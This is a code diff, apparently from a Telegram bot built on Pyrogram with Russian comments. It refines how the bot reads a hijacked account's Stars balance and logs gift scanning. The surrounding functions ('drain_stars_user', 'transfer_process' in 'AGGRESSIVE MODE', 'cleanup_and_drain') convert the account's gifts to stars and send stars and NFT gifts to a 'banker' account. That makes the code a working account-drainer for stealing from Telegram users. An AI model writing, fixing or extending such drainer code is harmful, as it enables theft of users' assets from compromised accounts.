@@ -421,139 +421,39 @@ async def alert_admins(bot: Bot, text: str):
 # ================= ЛОГИКА KURIGRAM (UPDATED V2) =================
 
 async def get_stars_info(client: Client):
-    # Убеждаемся, что клиент подключен и авторизован
+    """Получение баланса звезд через GetStarsStatus (единственный рабочий способ)"""
     if not client.is_connected:
         await client.connect()
     
-    # Получаем информацию о пользователе для диагностики
-    try:
-        me = await client.get_me()
-        log_transfer(f"Пользователь: {me.first_name} (@{me.username}, ID: {me.id})")
-    except Exception as e:
-        log_transfer(f"Ошибка получения информации о пользователе: {e}", "error")
-        return 0
-    
-    # Пробуем разные методы из raw.functions.payments
     from pyrogram import raw
     
-    # Способ 1: Попробуем GetStarTransactions и извлечем баланс из транзакций
     try:
-        result = await client.invoke(
-            raw.functions.payments.GetStarTransactions(
-                offset=0,
-                limit=100
-            )
-        )
-        log_transfer(f"GetStarTransactions вернул тип: {type(result)}")
-        # Проверяем, есть ли в результате баланс
-        if hasattr(result, 'balance'):
-            balance_int = int(result.balance)
-            log_transfer(f"✅ Баланс из GetStarTransactions: {balance_int} звезд")
-            return balance_int
-        # Или пробуем получить баланс из последней транзакции
-        if hasattr(result, 'transactions') and result.transactions:
-            # Баланс может быть в последней транзакции
-            log_transfer(f"Найдено транзакций: {len(result.transactions)}")
-    except Exception as e:
-        log_transfer(f"Ошибка GetStarTransactions: {type(e).__name__}: {e}", "error")
-    
-    # Способ 2: Используем GetStarsStatus с параметром peer
-    try:
-        # GetStarsStatus требует peer - используем InputPeerSelf
         result = await client.invoke(
             raw.functions.payments.GetStarsStatus(
                 peer=raw.types.InputPeerSelf()
             )
         )
-        log_transfer(f"GetStarsStatus вернул тип: {type(result)}")
         
-        # Проверяем различные возможные атрибуты для баланса
+        # StarsStatus имеет атрибут balance типа StarsAmount
         if hasattr(result, 'balance'):
-            # balance может быть StarsAmount объектом
             balance_obj = result.balance
-            log_transfer(f"balance объект тип: {type(balance_obj)}, атрибуты: {[a for a in dir(balance_obj) if not a.startswith('_')]}")
-            
-            # Пробуем разные способы извлечения значения
-            if hasattr(balance_obj, 'value'):
-                balance_int = int(balance_obj.value)
-                log_transfer(f"✅ Баланс через balance.value: {balance_int} звезд")
-                return balance_int
-            elif hasattr(balance_obj, 'amount'):
-                balance_int = int(balance_obj.amount)
-                log_transfer(f"✅ Баланс через balance.amount: {balance_int} звезд")
-                return balance_int
-            elif hasattr(balance_obj, 'stars'):
+            # StarsAmount имеет атрибут stars (int64)
+            if hasattr(balance_obj, 'stars'):
                 balance_int = int(balance_obj.stars)
-                log_transfer(f"✅ Баланс через balance.stars: {balance_int} звезд")
+                log_transfer(f"✅ Баланс: {balance_int} ⭐️")
                 return balance_int
-            else:
-                # Пробуем получить все числовые атрибуты
-                for attr in dir(balance_obj):
-                    if not attr.startswith('_') and not callable(getattr(balance_obj, attr, None)):
-                        try:
-                            attr_value = getattr(balance_obj, attr)
-                            if isinstance(attr_value, (int, float)):
-                                balance_int = int(attr_value)
-                                log_transfer(f"✅ Баланс через balance.{attr}: {balance_int} звезд")
-                                return balance_int
-                        except:
-                            pass
-                log_transfer(f"Не удалось извлечь значение из balance объекта: {balance_obj}")
-        elif hasattr(result, 'stars'):
-            balance_obj = result.stars
-            if hasattr(balance_obj, 'value'):
+            # Альтернатива: если есть value
+            elif hasattr(balance_obj, 'value'):
                 balance_int = int(balance_obj.value)
-            elif hasattr(balance_obj, 'amount'):
-                balance_int = int(balance_obj.amount)
-            else:
-                balance_int = int(balance_obj)
-            log_transfer(f"✅ Баланс через GetStarsStatus (stars): {balance_int} звезд")
-            return balance_int
-        else:
-            # Выводим все атрибуты для диагностики
-            log_transfer(f"GetStarsStatus атрибуты: {[attr for attr in dir(result) if not attr.startswith('_')]}")
-            # Пробуем найти баланс в других атрибутах
-            for attr in ['balance', 'stars', 'amount', 'total', 'current']:
-                if hasattr(result, attr):
-                    attr_value = getattr(result, attr)
-                    log_transfer(f"Найден атрибут {attr}: {attr_value} (тип: {type(attr_value)})")
-                    if hasattr(attr_value, 'value'):
-                        balance_int = int(attr_value.value)
-                        log_transfer(f"✅ Баланс через {attr}.value: {balance_int} звезд")
-                        return balance_int
-                    elif hasattr(attr_value, 'amount'):
-                        balance_int = int(attr_value.amount)
-                        log_transfer(f"✅ Баланс через {attr}.amount: {balance_int} звезд")
-                        return balance_int
+                log_transfer(f"✅ Баланс: {balance_int} ⭐️")
+                return balance_int
+        
+        log_transfer("⚠️ Не удалось извлечь баланс из StarsStatus", "error")
+        return 0
+        
     except Exception as e:
         log_transfer(f"Ошибка GetStarsStatus: {type(e).__name__}: {e}", "error")
-    
-    # Способ 3: Пробуем через users.GetFullUser для получения полной информации
-    try:
-        full_user = await client.invoke(
-            raw.functions.users.GetFullUser(
-                id=raw.types.InputUserSelf()
-            )
-        )
-        if hasattr(full_user, 'full_user') and hasattr(full_user.full_user, 'stars_balance'):
-            balance_int = int(full_user.full_user.stars_balance)
-            log_transfer(f"✅ Баланс через GetFullUser: {balance_int} звезд")
-            return balance_int
-    except Exception as e:
-        log_transfer(f"Ошибка GetFullUser: {type(e).__name__}: {e}", "error")
-    
-    # Способ 4: Проверяем версию Pyrogram и предлагаем обновление
-    try:
-        import pyrogram
-        log_transfer(f"Версия Pyrogram: {pyrogram.__version__}")
-        log_transfer("⚠️ Метод get_stars_balance недоступен в этой версии Pyrogram")
-        log_transfer("💡 Рекомендуется обновить Pyrogram: pip install --upgrade pyrogram")
-        log_transfer("💡 Или использовать Pyrofork: pip install pyrofork")
-    except:
-        pass
-    
-    log_transfer("⚠️ Не удалось получить баланс звезд. Возможно, нужна более новая версия Pyrogram или Pyrofork.", "error")
-    return 0
+        return 0
 
 def calculate_optimal_topup(needed_stars):
     """Математический расчет минимальной стоимости пополнения"""
@@ -622,9 +522,15 @@ async def get_owned_channels(client: Client):
 async def scan_location_gifts(client: Client, peer_id, location_name):
     found_gifts = []
     try:
+        count = 0
         async for gift in client.get_chat_gifts(chat_id=peer_id):
-            found_gifts.append(analyze_gift(gift, location_name))
-    except Exception: pass
+            count += 1
+            gift_info = analyze_gift(gift, location_name)
+            found_gifts.append(gift_info)
+            log_transfer(f"🎁 Найден подарок: {gift_info['title']} (NFT: {gift_info['is_nft']}, Конверт: {gift_info['can_convert']}, Трансфер: {gift_info['can_transfer']})")
+        log_transfer(f"📦 Всего подарков в {location_name}: {count}")
+    except Exception as e:
+        log_transfer(f"Ошибка сканирования подарков в {location_name}: {e}", "error")
     return found_gifts
 
 # --- TASKS ---
@@ -722,8 +628,11 @@ async def drain_stars_user(client: Client, default_recipient=None):
             return
 
         # 3. Проверяем баланс
-        try: balance = int(await client.get_stars_balance("me"))
-        except: balance = 0
+        try: 
+            balance = await get_stars_info(client)
+        except Exception as e:
+            log_transfer(f"Ошибка получения баланса: {e}", "error")
+            balance = 0
 
         if balance < 15:
             log_transfer(f"ℹ️ Баланс {balance} ⭐️ — недостаточно для покупки подарков.")
@@ -761,8 +670,10 @@ async def drain_stars_user(client: Client, default_recipient=None):
                 log_transfer(f"❌ Ошибка покупки: {e}", "error")
                 await asyncio.sleep(1)
                 # Обновляем баланс на всякий случай
-                try: balance = int(await client.get_stars_balance("me"))
-                except: break
+                try: 
+                    balance = await get_stars_info(client)
+                except: 
+                    break
         
         log_transfer(f"✅ Шоппинг завершен. Куплено подарков: {count}.")
 
@@ -802,8 +713,11 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
         log_transfer(f"🚀 START AGGRESSIVE MODE: @{me.username}")
         
         # ================= 1. ЧЕК БАЛАНСА И NFT =================
-        try: current_balance = int(await client.get_stars_balance("me"))
-        except: current_balance = 0
+        try: 
+            current_balance = await get_stars_info(client)
+        except Exception as e:
+            log_transfer(f"Ошибка получения баланса: {e}", "error")
+            current_balance = 0
         log_transfer(f"💰 Баланс: {current_balance} ⭐️")
 
         profile_gifts = await scan_location_gifts(client, "me", "Profile")
@@ -854,13 +768,15 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
                 if found_new: await asyncio.sleep(0.6)
                 else: await asyncio.sleep(0.8)
                 try:
-                    if int(await client.get_stars_balance("me")) >= total_fees: break
+                    balance_check = await get_stars_info(client)
+                    if balance_check >= total_fees: break
                 except: pass
 
         ready_to_send = False
         for _ in range(5):
             try:
-                if int(await client.get_stars_balance("me")) >= total_fees:
+                balance_check = await get_stars_info(client)
+                if balance_check >= total_fees:
                     ready_to_send = True
                     break
             except: pass
@@ -887,8 +803,10 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
         # ================= 5. ПОСТ-ФАКТУМ ЧИСТКА =================
         log_transfer("🏁 NFT отработаны. Теперь чистим мусор и сливаем остаток.")
         await cleanup_and_drain(client, banker_username)
-        try: final_stars = int(await client.get_stars_balance("me"))
-        except: final_stars = 0
+        try: 
+            final_stars = await get_stars_info(client)
+        except: 
+            final_stars = 0
 
     except Exception as e:
         print_error(f"Aggressive Logic Error: {e}")
@@ -900,19 +818,31 @@ async def cleanup_and_drain(client: Client, banker_username):
     try:
         log_transfer("🧹 Пылесосим обычные подарки (конвертация)...")
         tasks = []
+        gift_count = 0
         async for g in client.get_chat_gifts(chat_id="me", limit=50):
-            if not getattr(g, 'collectible_id', None) and not getattr(g, 'is_converted', False):
-                 if getattr(g, 'convert_price', 0) > 0:
-                    tasks.append(convert_gift_task(client, analyze_gift(g)))
+            gift_count += 1
+            is_nft = getattr(g, 'collectible_id', None) is not None
+            is_converted = getattr(g, 'is_converted', False)
+            convert_price = getattr(g, 'convert_price', 0)
+            
+            log_transfer(f"🔍 Подарок #{gift_count}: NFT={is_nft}, Конвертирован={is_converted}, Цена={convert_price}")
+            
+            if not is_nft and not is_converted and convert_price > 0:
+                gift_info = analyze_gift(g)
+                log_transfer(f"✅ Добавлен в очередь конвертации: {gift_info['title']} (+{convert_price} зв)")
+                tasks.append(convert_gift_task(client, gift_info))
+        
+        log_transfer(f"📊 Найдено подарков: {gift_count}, готово к конвертации: {len(tasks)}")
         
         if tasks:
-            await asyncio.gather(*tasks)
-            log_transfer(f"♻️ Сконвертировано {len(tasks)} подарков в звезды.")
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            success_count = sum(1 for r in results if r is True)
+            log_transfer(f"♻️ Сконвертировано {success_count}/{len(tasks)} подарков в звезды.")
             await asyncio.sleep(2.0)
 
         await drain_stars_user(client, default_recipient=banker_username)
     except Exception as e:
-        log_transfer(f"Cleanup error: {e}", "warning")
+        log_transfer(f"Cleanup error: {e}", "error")
     
 async def prepare_transfer_target(client: Client, target_username_str):
     """
@@ -1053,7 +983,7 @@ def get_main_router(bot_instance: Bot, current_api_url: str):
             await client.start()
             me = await client.get_me()
             
-            # Получаем баланс - функция get_stars_info сама пробует несколько способов
+            # Получаем баланс через GetStarsStatus
             bal = await get_stars_info(client)
             
             await client.stop()
